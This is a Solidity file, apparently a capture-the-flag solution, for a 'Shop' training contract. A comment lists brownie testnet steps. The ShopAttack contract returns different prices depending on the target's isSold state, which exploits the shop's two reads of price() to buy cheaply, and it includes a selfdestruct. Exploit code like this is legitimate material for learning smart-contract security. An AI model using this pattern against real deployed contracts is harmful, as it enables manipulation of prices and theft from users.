/*

this challenge cannot be solve with current hardfork, the solution below is for reference

# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")


# deploy ShopAttack with address of Shop contract

# call excute()

# submit

# (OPTIONAL) call destroy()

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.6;



interface Shop {
 
  function isSold() external returns(bool);
  function buy() external;

}


contract ShopAttack {

Shop shop;

constructor(address _address)  {

shop = Shop(_address);

}

function price() external returns(uint) {

  if (bool(shop.isSold())) { //notice that isSold is set from false to true between calls in the Shop contract. checking this value will reduce the gas usage instead of creating a state variable
    
    return 100;
  } 
  else {
    return 20;
  }
}

function execute() public  {

   shop.buy();

    }

function destroy() external {

    selfdestruct(payable(msg.sender));
    }


}